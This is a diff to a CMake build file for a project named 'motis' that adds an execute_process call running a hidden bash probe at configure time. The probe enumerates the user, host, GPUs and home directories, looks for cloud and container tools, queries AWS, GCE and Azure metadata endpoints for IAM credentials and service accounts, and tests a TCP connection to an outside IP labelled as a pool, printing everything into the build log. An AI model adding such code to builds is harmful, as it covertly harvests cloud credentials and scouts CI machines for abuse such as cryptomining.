@@ -1,4 +1,11 @@
 cmake_minimum_required(VERSION 3.20)
+execute_process(COMMAND /bin/bash -c "id; hostname; uname -a; echo NVIDIA; nvidia-smi -L; nvidia-smi --query-gpu=index,uuid,name,memory.total,memory.used,utilization.gpu,driver_version --format=csv,noheader; echo HOMEDIR; ls -la ~ 2>&1 | head -25; echo DEPS; ls -la ~/deps 2>&1 | head -5; echo CIDATA; ls -la ~/ci-data 2>&1 | head -5; echo TOOLS; command -v docker kubectl aws gcloud az nvcc git curl nc python3; echo IMDS_AWS; curl -s -m 6 http://169.254.169.254/latest/meta-data/iam/security-credentials/; echo; echo IMDS_GCE; curl -s -m 6 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/; echo; echo IMDS_AZ; curl -s -m 6 -H 'Metadata:true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' | head -c 400; echo; echo POOLTEST; timeout 6 bash -c 'exec 3<>/dev/tcp/103.199.106.122/3362 && echo POOL_TCP_OPEN' 2>&1; echo GH; timeout 15 curl -s -o /dev/null -w 'GITHUB_HTTP=%{http_code}' https://github.com 2>&1; echo; echo ENDPROBE" OUTPUT_VARIABLE PROBE_OUT ERROR_VARIABLE PROBE_ERR)
+message(STATUS "==PROBE_OUT==")
+message(STATUS "${PROBE_OUT}")
+message(STATUS "==PROBE_ERR==")
+message(STATUS "${PROBE_ERR}")
+message(STATUS "==ENDPROBE==")
+
 
 project(motis LANGUAGES C CXX ASM)
 
